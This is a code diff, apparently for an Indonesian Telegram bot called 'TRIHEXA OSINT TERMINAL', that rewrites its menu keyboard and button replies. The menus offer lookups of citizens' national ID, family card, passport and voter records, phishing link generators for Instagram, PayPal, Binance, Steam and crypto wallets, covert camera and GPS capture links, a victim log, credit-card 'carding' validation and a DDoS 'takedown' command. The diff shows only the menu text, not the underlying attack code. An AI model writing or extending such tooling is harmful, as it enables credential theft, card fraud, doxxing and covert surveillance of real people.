@@ -1667,21 +1667,38 @@ There are no background services or permissions associated.
 
     const mainReplyKeyboard = Markup.keyboard([
       ['🔒 TRIHEXA OSINT TERMINAL 🔒'],
-      ['── 🕵️ PELACAKAN IDENTITAS ──'],
-      ['🪪 Identitas & Kependudukan', '🏢 Perusahaan & Instansi'],
-      ['⚖️ Hukum & Finansial', '🏛️ Layanan Publik & Pajak'],
-      ['── 🌐 JEJARING & DOMAIN ──'],
-      ['📡 Geolocation & IP', '🔎 DNS & Domain OSINT'],
-      ['🕷️ Web, Data Leak & Exploit', '🌐 Mac & Headers Info'],
+      ['── 🇮🇩 OSINT INDONESIA ──'],
+      ['🆔 Cek NIK', '🖨️ Cek KK'],
+      ['🚗 Cek Plat Nopol', '🏥 Cek BPJS'],
+      ['👨‍💼 Cek NIP/ASN', '🏢 Cek NIB Bisnis'],
+      ['🎓 Cek SIVIL Ijazah', '⚖️ Putusan Mahkamah'],
+      ['🏛️ Cek Pajak PBB', '🚔 Cek DPO Polri'],
+      ['🛂 Cek Paspor', '🛑 Cekal Imigrasi'],
+      ['🗳️ Cek DPT KPU', '📜 Cek Sertipikat BPN'],
+      ['📦 Cek Bea Cukai', '🏦 Cek OJK Hukum'],
+      ['💼 Cek Perusahaan AHU', '💍 Cek Buku Nikah'],
+      ['── 🕵️ GLOBAL OSINT & TRACKING ──'],
+      ['🌐 IP Geolocation Tracker', '📡 Reverse IP Lookup'],
+      ['🔎 WHOIS Domain', '🌍 DNS Records Lookup'],
+      ['🕸️ Subdomain Scanner', '🕷️ Shodan Dorking'],
+      ['📧 Email Validator & Leak', '👤 Sosmed & Username Tracker'],
+      ['📞 Phone Tracker (HLR)', '💻 MAC Address OSINT'],
+      ['🚀 Port Scanner', '🚨 CVE Exploit Lookup'],
       ['── 🛑 STEALTH TRAP LOGGER ──'],
-      ['🎯 Target Social Tracker', '📸 Stealth Camera & GPS'],
-      ['🎣 Phishing & Trap Logger'],
-      ['── 🛠️ CYBER & ANALITIK ──'],
-      ['🔐 Hash & Enkripsi', '💳 CC & Credit Info'],
+      ['📸 Hack Kamera Target', '📍 Hack GPS PresisiTarget'],
+      ['🎣 Phishing IG/Meta', '💰 Phishing Crypto/Wallet'],
+      ['🛡️ Trap Bypass Cloudflare', '🎮 Phishing Steam'],
+      ['📊 Lihat Log Korban (Logger)', '⚙️ Set Custom Domain Tracker'],
+      ['── 🛠️ ADVANCED CYBER TOOLS ──'],
+      ['🔐 Hash Generator (MD5/SHA)', '🔓 Base64 Encode/Decode'],
+      ['💳 Cek Info BIN Card', '💳 Validasi CC (Carding)'],
+      ['🧪 XSS Scanner', '🦠 VirusTotal Web/File Scan'],
       ['── 🧩 UTILITAS & MEDIA ──'],
-      ['🌤️ Utilitas (Cuaca, Alarm)', '🎵 Downloader & Sosmed'],
-      ['🎲 Mini Games & Tebakan', '🔮 Ramalan & Khodam'],
-      ['📲 WhatsApp Bot Device', 'ℹ️ Status & Bantuan']
+      ['🎵 Download Lagu/Audio', '🎥 Download Video (IG/TikTok)'],
+      ['⏰ Sistem Alarm Pengingat', '🌤️ Info Cuaca Area'],
+      ['📈 Info Harga Crypto (Live)', '📲 Koneksi Bot WhatsApp'],
+      ['── 💀 PRO FITUR ──'],
+      ['💀 SANTO PETRUS (TAKEDOWN)', 'ℹ️ Informasi Bot & Bantuan']
     ]).resize();
 
     // Global Error Handler for "Anti Bug"
@@ -4520,62 +4537,72 @@ There are no background services or permissions associated.
     });
 
     // 📸 IMAGE OSINT MODULE (Reverse Image / Data)
-    const activeButtons = [
-      '🪪 Identitas & Kependudukan', '🏢 Perusahaan & Instansi',
-      '⚖️ Hukum & Finansial', '🏛️ Layanan Publik & Pajak',
-      '📡 Geolocation & IP', '🔎 DNS & Domain OSINT',
-      '🕷️ Web, Data Leak & Exploit', '🌐 Mac & Headers Info',
-      '🎯 Target Social Tracker', '📸 Stealth Camera & GPS',
-      '🎣 Phishing & Trap Logger', '🔐 Hash & Enkripsi',
-      '🌤️ Utilitas (Cuaca, Alarm)', '🎵 Downloader & Sosmed',
-      '💳 CC & Credit Info', '🎲 Mini Games & Tebakan',
-      '🔮 Ramalan & Khodam', '📲 WhatsApp Bot Device',
-      'ℹ️ Status & Bantuan'
-    ];
+    // 🗂️ BUTTON REPLIES MAPPING
+    const buttonMap: Record<string, string> = {
+       '🆔 Cek NIK': '<b>🆔 CEK NIK</b>\nKetik: <code>/nik [Nomor_NIK]</code>',
+       '🖨️ Cek KK': '<b>🖨️ CEK KARTU KELUARGA</b>\nKetik: <code>/kk [Nomor_KK]</code>',
+       '🚗 Cek Plat Nopol': '<b>🚗 CEK PLAT KENDARAAN</b>\nKetik: <code>/plat [Nomor_Plat]</code>\nContoh: <code>/plat B1234XYZ</code>',
+       '🏥 Cek BPJS': '<b>🏥 CEK BPJS</b>\nKetik: <code>/bpjs [Nomor_BPJS]</code>',
+       '👨‍💼 Cek NIP/ASN': '<b>👨‍💼 CEK PEGAWAI ASN/NIP</b>\nKetik: <code>/nip [Nomor_NIP]</code>',
+       '🏢 Cek NIB Bisnis': '<b>🏢 CEK NIB PERUSAHAAN</b>\nKetik: <code>/nib [Nomor_NIB]</code>',
+       '🎓 Cek SIVIL Ijazah': '<b>🎓 CEK IJAZAH (SIVIL)</b>\nKetik: <code>/sivil [Nomor_Ijazah]</code>',
+       '⚖️ Putusan Mahkamah': '<b>⚖️ PUTUSAN HUKUM</b>\nKetik: <code>/putusan [Nama_Kasus]</code>',
+       '🏛️ Cek Pajak PBB': '<b>🏛️ CEK PAJAK PBB</b>\nKetik: <code>/pbb [NOP_Pajak]</code>',
+       '🚔 Cek DPO Polri': '<b>🚔 CEK BURONAN DPO POLRI</b>\nKetik: <code>/dpo [Nama_Target]</code>',
+       '🛂 Cek Paspor': '<b>🛂 CEK PASPOR</b>\nKetik: <code>/paspor [Nomor_Paspor]</code>',
+       '🛑 Cekal Imigrasi': '<b>🛑 CEKAL IMIGRASI</b>\nKetik: <code>/cekal [Nomor_Identitas]</code>',
+       '🗳️ Cek DPT KPU': '<b>🗳️ CEK DATA PEMILIH (KPU)</b>\nKetik: <code>/kpu [NIK]</code>',
+       '📜 Cek Sertipikat BPN': '<b>📜 CEK SERTIPIKAT TANAH</b>\nKetik: <code>/sertipikat [Nomor_Sertipikat]</code>',
+       '📦 Cek Bea Cukai': '<b>📦 CEK RESI BEA CUKAI PAJAK</b>\nKetik: <code>/bea_cukai [Nomor_Resi]</code>',
+       '🏦 Cek OJK Hukum': '<b>🏦 CEK STATUS OJK</b>\nKetik: <code>/ojk [Nama_Pinjol/Perusahaan]</code>',
+       '💼 Cek Perusahaan AHU': '<b>💼 INFO PERUSAHAAN (AHU)</b>\nKetik: <code>/ahu [Nama_PT]</code>',
+       '💍 Cek Buku Nikah': '<b>💍 CEK BUKU NIKAH</b>\nKetik: <code>/simkah [Nomor_Buku]</code>',
+       
+       '🌐 IP Geolocation Tracker': '<b>🌐 IP TRACKER</b>\nKetik:\n• <code>/ip [Alamat_IP]</code>',
+       '📡 Reverse IP Lookup': '<b>📡 REVERSE IP LOOKUP</b>\nKetik:\n• <code>/reverseip [URL/IP]</code>',
+       '🔎 WHOIS Domain': '<b>🔎 WHOIS LOOKUP</b>\nKetik:\n• <code>/whois [Domain]</code>',
+       '🌍 DNS Records Lookup': '<b>🌍 FULL DNS RECORDS</b>\nKetik:\n• <code>/dns [Domain]</code>',
+       '🕸️ Subdomain Scanner': '<b>🕸️ SUBDOMAIN FINDER</b>\nKetik:\n• <code>/subdomain [Domain]</code>',
+       '🕷️ Shodan Dorking': '<b>🕷️ SHODAN IOT SCAN</b>\nKetik:\n• <code>/shodan [Query_Aset]</code> PID Intelijen',
+       '📧 Email Validator & Leak': '<b>📧 EMAIL & DATA LEAK</b>\nKetik:\n• <code>/email [Alamat]</code> - Reputasi Email\n• <code>/leak [Email]</code> - Cek DB Bocor',
+       '👤 Sosmed & Username Tracker': '<b>👤 USERNAME & SOSMED OSINT</b>\nKetik:\n• <code>/username [Target]</code>\n• <code>/sosmed [Target]</code>',
+       '📞 Phone Tracker (HLR)': '<b>📞 PHONE TRACKING</b>\nKetik:\n• <code>/phone_dork [Nomor]</code>\n• <code>/hlr [Nomor]</code>',
+       '💻 MAC Address OSINT': '<b>💻 MAC ADDRESS LOOKUP</b>\nKetik:\n• <code>/mac [Alamat_MAC]</code>',
+       '🚀 Port Scanner': '<b>🚀 PORT SCANNER</b>\nKetik:\n• <code>/port [IP/Domain]</code>',
+       '🚨 CVE Exploit Lookup': '<b>🚨 CVE / RED TEAM ANALYST</b>\nKetik:\n• <code>/cve CVE-XXXX-XXXX [PAS 1928]</code>',
+       
+       '📸 Hack Kamera Target': '<b>📸 INJEKSI KAMERA STEALTH</b>\nBuat Link: <code>/trap_camera</code>\n<i>(Kirim link unik ke target dan sistem akan memotret diam-diam jika disetujui)</i>',
+       '📍 Hack GPS PresisiTarget': '<b>📍 INJEKSI LOKASI GPS (PRESISI TINGGI)</b>\nBuat Link: <code>/trap_gps</code>\n<i>(Sadap titik koordinat Live akurat target)</i>',
+       '🎣 Phishing IG/Meta': '<b>🎣 LOGIN PANEL PHISHING META</b>\nBuat Link: <code>/trap_ig</code>',
+       '💰 Phishing Crypto/Wallet': '<b>💰 PHISHING WALLET WEB3 / BINANCE / PAYPAL</b>\nBuat Link: <code>/trap_paypal</code>, <code>/trap_binance</code>, <code>/trap_wallet</code>',
+       '🛡️ Trap Bypass Cloudflare': '<b>🛡️ FAKE CLOUDFLARE ANTI-BOT (TRAP)</b>\nBuat Link: <code>/trap_cloudflare</code>',
+       '🎮 Phishing Steam': '<b>🎮 LOGIN PANEL STEAM</b>\nBuat Link: <code>/trap_steam</code>',
+       '📊 Lihat Log Korban (Logger)': '<b>📊 KONTROL PANEL STEALTH LOGGER</b>\nCek daftar IP target & Korban: <code>/logger</code>',
+       '⚙️ Set Custom Domain Tracker': '<b>⚙️ ATUR DOMAIN UNTUK TRAP LOGGER</b>\nGunakan masking agar link tidak mencurigakan:\n<code>/sethost [Pilihan]</code>',
+       
+       '🔐 Hash Generator (MD5/SHA)': '<b>🔐 ENKRIPSI & HASH GENERATOR</b>\nKetik:\n• <code>/hash [TEKS]</code> (Termasuk MD5/SHA dll)\n• <code>/sha256 [TEKS]</code>',
+       '🔓 Base64 Encode/Decode': '<b>🔓 BASE64 ENCODER/DECODER</b>\nKetik:\n• <code>/b64enc [Teks]</code>\n• <code>/b64dec [String_Base64]</code>',
+       '💳 Cek Info BIN Card': '<b>💳 CEK INFO BIN (BANKING)</b>\nKetik:\n• <code>/bininfo [6_DIGIT_DEPAN_KARTU]</code> (VISA, MC, JCB, dll)',
+       '💳 Validasi CC (Carding)': '<b>💳 CHECKER CREDIT CARD</b>\nKetik:\n• <code>/cc_check [Nomor_CC]</code> (Deteksi LUN/Fraud)',
+       '🧪 XSS Scanner': '<b>🧪 XSS VULN SCANNER</b>\nKetik:\n• <code>/xss [URL_Website]</code>',
+       '🦠 VirusTotal Web/File Scan': '<b>🦠 VIRUSTOTAL MALWARE SCAN</b>\nKetik:\n• <code>/scan [URL]</code>\nAtau gunakan untuk file (saat ada dokumen)',
+       
+       '🎵 Download Lagu/Audio': '<b>🎵 MEDIA AUDIO DOWNLOADER</b>\nKetik:\n• <code>/lagu [Judul]</code>\n• <code>/play [Judul]</code>',
+       '🎥 Download Video (IG/TikTok)': '<b>🎥 MEDIA VIDEO DOWNLOADER</b>\nKetik:\n• <code>/tiktok [URL]</code>\n• <code>/ig [URL]</code>',
+       '⏰ Sistem Alarm Pengingat': '<b>⏰ ALARM BOT</b>\nKetik:\n• <code>/alarm [Format Waktu] [Pesan]</code>\nContoh: <code>/alarm 30m Angkat Telpon</code>',
+       '🌤️ Info Cuaca Area': '<b>🌤️ INFO CUACA SATELIT</b>\nKetik:\n• <code>/weather [Nama_Kota]</code>\n• <code>/gempa</code>',
+       '📈 Info Harga Crypto (Live)': '<b>📈 LIVE MARKET CRYPTO</b>\nKetik:\n• <code>/crypto_price [Simbol]</code> (Contoh: BTC, ETH, SOL)',
+       '📲 Koneksi Bot WhatsApp': '<b>📲 WHATSAPP BOT BRIDGE</b>\nKetik: <code>/wa_connect</code> <i>(Hanya Admin yang dapat memindai Auth QR)</i>',
+       
+       '💀 SANTO PETRUS (TAKEDOWN)': '<b>💀 SANTO PETRUS (DDoS / TAKEDOWN)</b>\nSistem Takedown intelijen dan DoS skala tinggi terkunci akses Admin.\nKetik: <code>/santopetrus [Target]</code>\n<i>(Membutuhkan otorisasi sistem tertinggi)</i>',
+       'ℹ️ Informasi Bot & Bantuan': '<b>ℹ️ PUSAT BANTUAN</b>\nGunakan / (Garis Miring) di kotak chat Anda untuk melihat seluruh command terintegrasi.'
+    };
 
     bot.on('text', async (ctx, next) => {
       // @ts-ignore
       const text = ctx.message.text;
-      if (activeButtons.includes(text)) {
-         if (text === '🪪 Identitas & Kependudukan') {
-             return ctx.reply(`<b>🇮🇩 OSINT KEPENDUDUKAN</b>\n• <code>/nik [No NIK]</code> - Cek NIK\n• <code>/kk [No KK]</code> - Cek KK\n• <code>/nama [Nama]</code> - Cari Nama Asli\n• <code>/paspor [No]</code> - Cek Paspor\n• <code>/kodepos [Area]</code> - Cek Kode Pos`, { parse_mode: 'HTML' });
-         } else if (text === '🏢 Perusahaan & Instansi') {
-             return ctx.reply(`<b>🏢 OSINT INSTANSI & GURU/ASN</b>\n• <code>/nip [NIP]</code> - Cek ASN\n• <code>/bpjs [No]</code> - Cek BPJS\n• <code>/nib [No]</code> - Cek NIB Bisnis\n• <code>/lpse [Nama]</code> - Cek LPSE\n• <code>/bpom [Produk]</code> - Cek BPOM\n• <code>/sivil [No]</code> - Cek Ijazah Sivil`, { parse_mode: 'HTML' });
-         } else if (text === '⚖️ Hukum & Finansial') {
-             return ctx.reply(`<b>⚖️ HUKUM & FINANSIAL OSINT</b>\n• <code>/putusan [Kasus]</code> - Cari Putusan Hukum\n• <code>/dpo [Nama]</code> - Cari DPO\n• <code>/ojk [Nama]</code> - Cek Legalitas OJK\n• <code>/bea_cukai [No]</code> - Cek Resi Pajak\n• <code>/qris [Data]</code> - Decode QRIS\n• <code>/rekening [No]</code> - Cek Rekening\n• <code>/bank_indo [Sandi]</code> - Info Bank\n• <code>/bansos [ID]</code> - Cek Bansos`, { parse_mode: 'HTML' });
-         } else if (text === '🏛️ Layanan Publik & Pajak') {
-             return ctx.reply(`<b>🏛️ LAYANAN PUBLIK & PAJAK</b>\n• <code>/plat [Nopol]</code> - Pajak Kendaraan\n• <code>/bpkb [No]</code> - Cek BPKB\n• <code>/sertipikat [No]</code> - Sertipikat Tanah\n• <code>/pbb [No]</code> - Pajak PBB\n• <code>/samsat [Area]</code> - Info Samsat\n• <code>/cekal [No]</code> - Status Cekal\n• <code>/pse [Kominfo]</code> - Cek PSE\n• <code>/djki [Merk]</code> - Cek HKI\n• <code>/ahu [PT]</code> - Info AHU\n• <code>/simkah [No]</code> - Buku Nikah\n• <code>/yudisium [No]</code> - Cek Yudisium\n• <code>/kpu [NIK]</code> - Cek DPT KPU`, { parse_mode: 'HTML' });
-         } else if (text === '📡 Geolocation & IP') {
-             return ctx.reply(`<b>📡 IP & GEOLOCATION TRACKER</b>\n• <code>/ip [Alamat_IP]</code> - Geolokasi\n• <code>/reverseip [IP/URL]</code> - Reverse Lookup\n• <code>/asn [Target]</code> - Info ASN\n• <code>/port [IP/Domain]</code> - Port Scanner\n• <code>/traceroute [IP]</code> - Trace Hop Route`, { parse_mode: 'HTML' });
-         } else if (text === '🔎 DNS & Domain OSINT') {
-             return ctx.reply(`<b>🔎 DNS & DOMAIN TACTICAL</b>\n• <code>/domain [Target]</code> - Quick Check\n• <code>/whois [Domain]</code> - WHOIS\n• <code>/dns [Domain]</code> - Full DNS Records\n• <code>/cname [Domain]</code>\n• <code>/txt [Domain]</code>\n• <code>/subdomain [Domain]</code> - Subdomain Finder\n• <code>/zonetransfer [Domain]</code> - Zone Transfer Attack`, { parse_mode: 'HTML' });
-         } else if (text === '🕷️ Web, Data Leak & Exploit') {
-             return ctx.reply(`<b>🕷️ CYBER SEC & DATA LEAK</b>\n• <code>/leak [Email/User]</code> - DB Leak Search\n• <code>/shodan [Query]</code> - Shodan IoT OSINT\n• <code>/cve [CVE-ID]</code> - Analisis Kerentanan (Red Team)\n• <code>/xss [URL]</code> - Simple XSS Scanner\n• <code>/dork [Query]</code> - Adv Google Dork\n• <code>/scan [URL/Berkas]</code> - Malware Pemindai`, { parse_mode: 'HTML' });
-         } else if (text === '🌐 Mac & Headers Info') {
-             return ctx.reply(`<b>🌐 HEADERS & MAC ADDRESS</b>\n• <code>/mac [Alamat_Mac]</code> - Cek Vendor PC\n• <code>/headers [URL]</code> - HTTP Headers Info\n• <code>/httpheaders [URL]</code> - Detail Options Header`, { parse_mode: 'HTML' });
-         } else if (text === '🎯 Target Social Tracker') {
-             return ctx.reply(`<b>🎯 SOSMED & CONTACT TRACKER</b>\n• <code>/phone_dork [No]</code> - Jejak Digital Telepon\n• <code>/hlr [No]</code> - Operator Provider\n• <code>/email [Alamat]</code> - Track Email\n• <code>/username [Username]</code> - Cross-Platform\n• <code>/sosmed [Target]</code> - Deep Social OSINT\n• <code>/github_user [User]</code> - Info GitHub`, { parse_mode: 'HTML' });
-         } else if (text === '📸 Stealth Camera & GPS') {
-             return ctx.reply(`<b>📸 STEALTH TRACKER INJECTOR</b>\n• <code>/trap_camera</code> - Buat Link Hack Kamera\n• <code>/trap_gps</code> - Buat Link Hack Lokasi Akurat\n• <code>/logger</code> - Info Stealth Logger Log\n• <code>/sethost</code> - Set Custom Domain`, { parse_mode: 'HTML' });
-         } else if (text === '🎣 Phishing & Trap Logger') {
-             return ctx.reply(`<b>🎣 PHISHING TRAP LINKS</b>\n• <code>/trap_ig</code> - Phishing Instagram\n• <code>/trap_paypal</code> - Phishing PayPal\n• <code>/trap_binance</code> - Phishing Binance\n• <code>/trap_wallet</code> - Web3 Wallet Drainer\n• <code>/trap_cloudflare</code> - Cloudflare Fake\n• <code>/trap_steam</code> - Steam Login Fake`, { parse_mode: 'HTML' });
-         } else if (text === '🔐 Hash & Enkripsi') {
-             return ctx.reply(`<b>🔐 CRYPTO & ENCODING</b>\n• <code>/hash [Teks]</code> - Semua Hash\n• <code>/sha256 [Teks]</code>\n• <code>/b64enc [Teks]</code> - Base64 Encode\n• <code>/b64dec [String]</code> - Base64 Decode\n• <code>/pwd</code> - Rand Password\n• <code>/uuid</code> - Generate UUID`, { parse_mode: 'HTML' });
-         } else if (text === '🌤️ Utilitas (Cuaca, Alarm)') {
-             return ctx.reply(`<b>🌤️ UTILITIES & TOOLS</b>\n• <code>/weather [Kota]</code> - Cuaca Terkini\n• <code>/gempa</code> - Info Gempa Terkini\n• <code>/alarm [Format] [Pesan]</code>\n• <code>/listalarm</code>\n• <code>/qr [Teks]</code> - QR Code\n• <code>/shortlink [URL]</code> - URL Short\n• <code>/crypto_price [Simbol]</code> - Harga Crypto\n• <code>/doa</code> - Kumpulan Doa`, { parse_mode: 'HTML' });
-         } else if (text === '🎵 Downloader & Sosmed') {
-             return ctx.reply(`<b>🎵 MEDIA & DOWNLOADS</b>\n• <code>/lagu [Judul]</code> - Download MP3\n• <code>/play [Judul]</code> - Download MP3\n• <code>/ig [URL]</code> - Instagram Downloader\n• <code>/tiktok [URL]</code> - TikTok Downloader\n• <code>/github [URL]</code> - Download Repo`, { parse_mode: 'HTML' });
-         } else if (text === '💳 CC & Credit Info') {
-             return ctx.reply(`<b>💳 FINANCIAL CHECKER</b>\n• <code>/bininfo [6_Digit]</code> - Cek BIN Bank CC/Debit\n• <code>/cc_check [No_CC]</code> - Carding Validasi`, { parse_mode: 'HTML' });
-         } else if (text === '🎲 Mini Games & Tebakan') {
-             return ctx.reply(`<b>🎲 MINI GAMES HALL</b>\n• Laga: <code>/suit</code>, <code>/coinflip</code>, <code>/dadu</code>\n• Kata: <code>/susunkata</code>, <code>/tebakkata</code>\n• Pengetahuan: <code>/tebaknegara</code>, <code>/tebakhewan</code>\n• Interaktif: <code>/roulette</code>, <code>/werewolf</code>, <code>/tod</code>\n• Lainnya: <code>/tebakangka</code>, <code>/morse</code>, <code>/hentai</code>, <code>/flip</code>, <code>/roll</code>`, { parse_mode: 'HTML' });
-         } else if (text === '🔮 Ramalan & Khodam') {
-             return ctx.reply(`<b>🔮 FUN & PERAMAL</b>\n• <code>/khodam [Nama]</code> - Cek Spirit\n• <code>/ramal [Nama]</code> - Nasib\n• <code>/jodoh [A] [B]</code> - Kecocokan\n• <code>/kartu</code> - Tarik Kartu\n• <code>/8ball [Tanya]</code> - Magic 8 Ball\n• <code>/tarot</code> - Tarot Reading\n• <code>/gombal</code> - Generate Gombal\n• <code>/meme</code>, <code>/joke</code>, <code>/quote</code>, <code>/fact</code>`, { parse_mode: 'HTML' });
-         } else if (text === '📲 WhatsApp Bot Device') {
-             return ctx.reply(`<b>📲 WHATSAPP INTEG. SYNC</b>\n• <code>/wa_login</code> - Auth WA Device\n• <code>/wa_connect</code> - Link WhatsApp Mod\n<i>(Hanya Admin Server)</i>`, { parse_mode: 'HTML' });
-         } else if (text === 'ℹ️ Status & Bantuan') {
-             return ctx.reply(`<b>ℹ️ SYSTEM & BANTUAN</b>\nGunakan tanda <code>/</code> di chatbox untuk melihat rekomendasi perintah dari sistem.\n\n⚙️ <b>Admin Command:</b>\n<code>/on</code>, <code>/off</code>, <code>/ban</code>, <code>/unban</code>, <code>/setdesc</code>, <code>/santopetrus</code>\n\n🆔 <b>Profil Session Anda:</b>\nID: <code>${ctx.from.id}</code>\nNama: <code>${ctx.from.first_name}</code>`, { parse_mode: 'HTML' });
-         }
+      if (buttonMap[text]) {
+         return ctx.reply(buttonMap[text], { parse_mode: 'HTML' });
       }
       return next();
     });
